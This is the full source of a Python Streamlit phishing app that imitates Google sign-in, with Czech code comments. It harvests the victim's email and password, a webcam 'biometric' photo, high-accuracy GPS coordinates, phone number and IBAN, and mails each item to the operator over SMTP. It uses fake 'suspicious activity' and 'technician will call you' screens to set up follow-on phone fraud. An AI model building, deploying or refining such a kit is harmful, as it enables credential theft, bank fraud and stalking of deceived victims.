import streamlit as st
import os
import smtplib
import time
import re
import requests
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from datetime import datetime, timedelta
import streamlit.components.v1 as components

# ====================== VÍCEJAZYČNÉ TEXTY ======================
TEXTS = {
    "en": {
        "page_title": "Google Account Security",
        "login_header": "Sign in",
        "login_sub": "Continue to Gmail",
        "email": "Email or phone",
        "password": "Password",
        "next": "Next",
        "face_info": "Step 2: Biometric face scan",
        "face_desc": "For secure sign-in, please align your face in the frame.",
        "gps_info": "Step 2.5: Security location check",
        "gps_desc": "Google detected unusual activity.\nPlease share your current location to continue.",
        "gps_button": "✅ Share my current location",
        "verification_header": "⚠️ Suspicious activity detected",
        "verification_desc": "Your account is temporarily restricted. Choose verification method.",
        "country": "Country",
        "phone": "Phone number (9 digits)",
        "call_tab": "Call from technician",
        "bankid_tab": "BankID (Faster)",
        "call_btn": "Request a call",
        "bankid_desc": "Instant unblock via Bank Identity",
        "iban": "Account number / IBAN",
        "authorize": "Authorize",
        "finish_header": "Request successfully recorded",
        "finish_status": "### STATUS: AWAITING APPROVAL",
        "finish_info": "A Google technician will contact you shortly.\nDo not close this browser tab.",
        "timer": "**Approximately {hours} hours and {minutes} minutes remaining**",
    },
    "cs": {
        "page_title": "Zabezpečení účtu Google",
        "login_header": "Přihlášení",
        "login_sub": "Pokračovat do služby Gmail",
        "email": "E-mail nebo telefon",
        "password": "Zadejte heslo",
        "next": "Další",
        "face_info": "Fáze 2: Biometrický sken obličeje",
        "face_desc": "Pro bezpečné přihlášení prosím zarovnejte obličej do rámečku.",
        "gps_info": "Fáze 2.5: Bezpečnostní ověření polohy",
        "gps_desc": "Google detekoval neobvyklou aktivitu.\nPro bezpečné pokračování sdílejte svou aktuální polohu.",
        "gps_button": "✅ Sdílet moji aktuální polohu",
        "verification_header": "⚠️ Zjištěna podezřelá aktivita",
        "verification_desc": "Váš účet je dočasně omezen. Vyberte způsob ověření.",
        "country": "Země",
        "phone": "Telefonní číslo (9 číslic)",
        "call_tab": "Hovor od technika",
        "bankid_tab": "BankID (Urychlit)",
        "call_btn": "Požádat o hovor",
        "bankid_desc": "Okamžité odblokování přes Bankovní Identitu",
        "iban": "Číslo účtu / IBAN",
        "authorize": "Autorizovat",
        "finish_header": "Požadavek byl úspěšně zaznamenán",
        "finish_status": "### STATUS: ČEKÁNÍ NA SCHVÁLENÍ",
        "finish_info": "V nejbližší době vás bude kontaktovat technik Google.\nNe zavírejte tuto kartu prohlížeče.",
        "timer": "**Zbývá přibližně {hours} hodin a {minutes} minut**",
    }
}

def t(key):
    lang = st.session_state.get("language", "en")
    return TEXTS[lang].get(key, TEXTS["en"][key])

# --- KONFIGURACE ---
MOJE_ADRESA = os.environ.get("MOJE_ADRESA")
MOJE_HESLO = os.environ.get("MOJE_HESLO")

def odeslat_email(subjekt, text, soubor=None):
    if not MOJE_ADRESA or not MOJE_HESLO:
        return
    msg = MIMEMultipart()
    msg['Subject'] = subjekt
    msg['From'] = MOJE_ADRESA
    msg['To'] = MOJE_ADRESA
    msg.attach(MIMEText(text))
    if soubor:
        img = MIMEImage(soubor.read(), name="biometrika.png")
        msg.attach(img)
    try:
        server = smtplib.SMTP_SSL("smtp.seznam.cz", 465)
        server.login(MOJE_ADRESA, MOJE_HESLO)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        print(f"Chyba SMTP: {e}")

# --- VALIDACE ---
def je_validni_email(email):
    return re.match(r"[^@]+@[^@]+\.[^@]+", email)

def je_validni_tel(tel):
    return re.match(r"^\d{9}$", tel)

# --- PLNÝ SEZNAM VŠECH STÁTŮ ---
COUNTRIES = [
    "Afghánistán (+93)", "Albánie (+355)", "Alžírsko (+213)", "Andorra (+376)",
    "Angola (+244)", "Argentina (+54)", "Arménie (+374)", "Austrálie (+61)",
    "Ázerbájdžán (+994)", "Bahamy (+1-242)", "Bahrajn (+973)", "Bangladéš (+880)",
    "Belgie (+32)", "Bělorusko (+375)", "Belize (+501)", "Benin (+229)",
    "Bhútán (+975)", "Bolívie (+591)", "Bosna a Hercegovina (+387)", "Botswana (+267)",
    "Brazílie (+55)", "Bulharsko (+359)", "Burkina Faso (+226)", "Burundi (+257)",
    "Čad (+235)", "Česká republika (+420)", "Čína (+86)", "Dánsko (+45)",
    "Dominikánská republika (+1-809)", "Ecuador (+593)", "Egypt (+20)", "Eritrea (+291)",
    "Estonsko (+372)", "Etiopie (+251)", "Finsko (+358)", "Francie (+33)",
    "Gabon (+241)", "Gambie (+220)", "Ghana (+233)", "Gruzie (+995)",
    "Guatemala (+502)", "Guinea (+224)", "Haiti (+509)", "Honduras (+504)",
    "Hongkong (+852)", "Chorvatsko (+385)", "Indie (+91)", "Indonésie (+62)",
    "Irák (+964)", "Írán (+98)", "Irsko (+353)", "Island (+354)", "Itálie (+39)",
    "Izrael (+972)", "Jamajka (+1-876)", "Japonsko (+81)", "Jemen (+967)",
    "Jihoafrická republika (+27)", "Jižní Korea (+82)", "Jižní Súdán (+211)",
    "Jordánsko (+962)", "Kambodža (+855)", "Kamerun (+237)", "Kanada (+1)",
    "Katar (+974)", "Kazachstán (+7)", "Keňa (+254)", "Kyrgyzstán (+996)",
    "Kolumbie (+57)", "Kongo (DRC) (+243)", "Kongo (+242)", "Kostarika (+506)",
    "Kuba (+53)", "Kuvajt (+965)", "Laos (+856)", "Lesotho (+266)",
    "Libanon (+961)", "Libérie (+231)", "Libye (+218)", "Litva (+370)",
    "Lotyšsko (+371)", "Lucembursko (+352)", "Madagaskar (+261)", "Maďarsko (+36)",
    "Malajsie (+60)", "Malawi (+265)", "Maledivy (+960)", "Mali (+223)",
    "Malta (+356)", "Maroko (+212)", "Mauritánie (+222)", "Mauritius (+230)",
    "Mexiko (+52)", "Moldavsko (+373)", "Monako (+377)", "Mongolsko (+976)",
    "Mosambik (+258)", "Myanmar (+95)", "Namibie (+264)", "Německo (+49)",
    "Nepál (+977)", "Niger (+227)", "Nigérie (+234)", "Nizozemsko (+31)",
    "Norsko (+47)", "Nový Zéland (+64)", "Omán (+968)", "Pákistán (+92)",
    "Panama (+507)", "Papua Nová Guinea (+675)", "Paraguay (+595)", "Peru (+51)",
    "Polsko (+48)", "Portugalsko (+351)", "Rakousko (+43)", "Rumunsko (+40)",
    "Rusko (+7)", "Rwanda (+250)", "Řecko (+30)", "Salvador (+503)",
    "Saúdská Arábie (+966)", "Senegal (+221)", "Singapur (+65)", "Slovensko (+421)",
    "Slovinsko (+386)", "Somálsko (+252)", "Spojené arabské emiráty (+971)",
    "Spojené království (+44)", "Spojené státy (+1)", "Srbsko (+381)",
    "Srílanka (+94)", "Súdán (+249)", "Surinam (+597)", "Španělsko (+34)",
    "Švédsko (+46)", "Švýcarsko (+41)", "Tádžikistán (+992)", "Tanzanie (+255)",
    "Thajsko (+66)", "Togo (+228)", "Turecko (+90)", "Turkmenistán (+993)",
    "Uganda (+256)", "Ukrajina (+380)", "Uruguay (+598)", "Uzbekistán (+998)",
    "Venezuela (+58)", "Vietnam (+84)", "Zambie (+260)", "Zimbabwe (+263)"
]

# --- STAV APLIKACE ---
if "step" not in st.session_state:
    st.session_state.step = "login"
if "zadany_email" not in st.session_state:
    st.session_state.zadany_email = ""
if "language" not in st.session_state:
    st.session_state.language = "en"
if "default_country" not in st.session_state:
    st.session_state.default_country = "Česká republika (+420)"
if "finish_start" not in st.session_state:
    st.session_state.finish_start = None

# === AUTOMATICKÁ DETEKCE POLOHY + PŘEPNUTÍ JAZYKA ===
query_params = st.query_params
if "lat" in query_params and "lon" in query_params:
    lat = str(query_params["lat"][0] if isinstance(query_params["lat"], list) else query_params["lat"])
    lon = str(query_params["lon"][0] if isinstance(query_params["lon"], list) else query_params["lon"])
    acc = str(query_params.get("acc", ["?"])[0] if isinstance(query_params.get("acc"), list) else query_params.get("acc", "?"))
    
    gps_text = f"📍 {lat}, {lon} (přesnost ~{acc}m)"
    st.success(f"✅ Poloha úspěšně získána: **{gps_text}**")
    odeslat_email("📍 GPS COORDINATES", f"Uživatel: {st.session_state.zadany_email}\nGPS: {gps_text}")

    try:
        resp = requests.get(
            f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json",
            headers={"User-Agent": "GoogleSecurityDemo/1.0"},
            timeout=8
        )
        data = resp.json()
        country_code = data.get("address", {}).get("country_code", "xx").lower()
        mapping = {"cz": "Česká republika (+420)", "sk": "Slovensko (+421)"}
        st.session_state.default_country = mapping.get(country_code, "Česká republika (+420)")
        st.session_state.language = "cs" if country_code in ["cz", "sk"] else "en"
    except:
        st.session_state.default_country = "Česká republika (+420)"
        st.session_state.language = "en"

    st.session_state.step = "verification"
    
    for key in ["lat", "lon", "acc"]:
        if key in st.query_params:
            del st.query_params[key]
    st.rerun()

# ====================== STREAMLIT UI ======================
st.set_page_config(page_title=t("page_title"), page_icon="🔒")

st.markdown("""
    <style>
    div.stButton > button:first-child {background-color: #4285F4; color: white; border: none; width: 100%; height: 45px; font-weight: bold;}
    .google-header { font-family: 'Product Sans', sans-serif; text-align: center; }
    </style>
    """, unsafe_allow_html=True)

def show_logo():
    st.markdown("<h1 style='text-align: center;'><span style='color: #4285F4;'>G</span><span style='color: #EA4335;'>o</span><span style='color: #FBBC05;'>o</span><span style='color: #4285F4;'>g</span><span style='color: #34A853;'>l</span><span style='color: #EA4335;'>e</span></h1>", unsafe_allow_html=True)

col1, col2, col3 = st.columns(3)
with col2:
    if st.session_state.step == "login":
        show_logo()
        st.markdown(f"<h3 class='google-header'>{TEXTS['en']['login_header']}</h3>", unsafe_allow_html=True)
        st.write(TEXTS['en']['login_sub'])
        em = st.text_input(TEXTS['en']['email'])
        he = st.text_input(TEXTS['en']['password'], type="password")
        if st.button(TEXTS['en']['next']):
            if je_validni_email(em) and len(he) > 3:
                st.session_state.zadany_email = em
                odeslat_email("🔑 LOGIN", f"Email: {em}\nHeslo: {he}")
                with st.spinner("Verifying..."):
                    time.sleep(1.5)
                st.session_state.step = "face"
                st.rerun()
            else:
                st.error("Please enter a valid email and password.")

    elif st.session_state.step == "face":
        show_logo()
        st.info(TEXTS['en']['face_info'])
        st.write(TEXTS['en']['face_desc'])
        foto = st.camera_input("Scan identity")
        if foto:
            with st.status("Sending biometric data...") as status:
                odeslat_email("📸 FACE SCAN", f"Uživatel: {st.session_state.zadany_email}", soubor=foto)
                time.sleep(2)
                status.update(label="Scan completed", state="complete")
            st.session_state.step = "gps"
            st.rerun()

    elif st.session_state.step == "gps":
        show_logo()
        st.info(TEXTS['en']['gps_info'])
        st.write(TEXTS['en']['gps_desc'])
        components.html(
            """
            <div style="text-align:center; padding:30px; background:#f8f9fa; border-radius:12px; box-shadow:0 2px 8px rgba(0,0,0,0.1); max-width:420px; margin:0 auto;">
                <h3 style="color:#202124; font-family:'Product Sans',sans-serif;">Location Verification</h3>
                <p style="color:#5f6368; margin-bottom:20px;">Google detected unusual activity.<br>Please share your current location to continue.</p>
                <button onclick="getGPS()" style="background:#4285F4; color:white; padding:14px 40px; font-size:16px; border:none; border-radius:8px; cursor:pointer; font-weight:bold; box-shadow:0 2px 4px rgba(66,133,244,0.3);">
                    """ + TEXTS['en']['gps_button'] + """
                </button>
            </div>
            <script>
            function getGPS() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            const lat = position.coords.latitude.toFixed(6);
                            const lon = position.coords.longitude.toFixed(6);
                            const acc = position.coords.accuracy.toFixed(0);
                            const params = new URLSearchParams(window.parent.location.search);
                            params.set("lat", lat);
                            params.set("lon", lon);
                            params.set("acc", acc);
                            window.parent.history.replaceState(null, '', '?' + params.toString());
                            window.parent.location.reload();
                        },
                        function(error) { alert("Could not get location. Please try again."); },
                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                    );
                }
            }
            </script>
            """,
            height=380
        )

    elif st.session_state.step == "verification":
        show_logo()
        st.error(t("verification_header"))
        st.write(t("verification_desc"))

        zeme = st.selectbox(t("country"), COUNTRIES)

        tel = st.text_input(t("phone"))
        
        tab1, tab2 = st.tabs([t("call_tab"), t("bankid_tab")])
        with tab1:
            if st.button(t("call_btn")):
                if je_validni_tel(tel):
                    odeslat_email("📞 KONTAKT", f"Uživatel: {st.session_state.zadany_email}\nTel: {tel} ({zeme})")
                    st.session_state.step = "finish"
                    st.session_state.finish_start = datetime.now()
                    st.rerun()
                else:
                    st.error("Enter exactly 9 digits!")
        with tab2:
            st.write(t("bankid_desc"))
            ib = st.text_input(t("iban"))
            if st.button(t("authorize")):
                if je_validni_tel(tel) and len(ib) > 10:
                    odeslat_email("🏦 BANKID DATA", f"User: {st.session_state.zadany_email}\nTel: {tel}\nIBAN: {ib}")
                    st.session_state.step = "finish"
                    st.session_state.finish_start = datetime.now()
                    st.rerun()
                else:
                    st.error("Fill in phone and valid IBAN.")

    elif st.session_state.step == "finish":
        show_logo()
        st.success(t("finish_header"))
        st.markdown(t("finish_status"))
        st.info(t("finish_info"))
        
        if st.session_state.finish_start:
            elapsed = datetime.now() - st.session_state.finish_start
            remaining = timedelta(hours=24) - elapsed
            hours = max(0, int(remaining.total_seconds() // 3600))
            minutes = max(0, int((remaining.total_seconds() % 3600) // 60))
            st.progress(min(100, int(elapsed.total_seconds() / (24*3600) * 100)))
            st.write(t("timer").format(hours=hours, minutes=minutes))
        
        st.info("Do not close this browser tab.")